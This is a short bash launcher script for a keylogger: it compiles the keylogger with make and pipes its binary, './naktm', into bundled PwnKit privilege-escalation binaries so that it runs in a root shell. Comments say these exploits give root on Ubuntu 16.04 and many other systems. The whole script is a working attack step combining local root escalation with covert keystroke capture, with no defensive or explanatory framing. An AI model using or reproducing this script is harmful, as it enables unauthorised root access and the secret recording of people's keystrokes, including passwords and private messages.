#!/bin/bash

# build the keylogger

make

# run keylogger inside a root shell
# Info:
# The PwnKit binaries, located in the privesc directory, give a root shell 
# upon running. They should work for Ubuntu 16.04, 32 bit or 64 bit, and
# many others.
# Here we pipe the ./naktm command into the root shell

echo "./naktm" | ./privesc/PwnKit32 # 32bit
# echo "./naktm" | ./privesc/PwnKit # 64bit
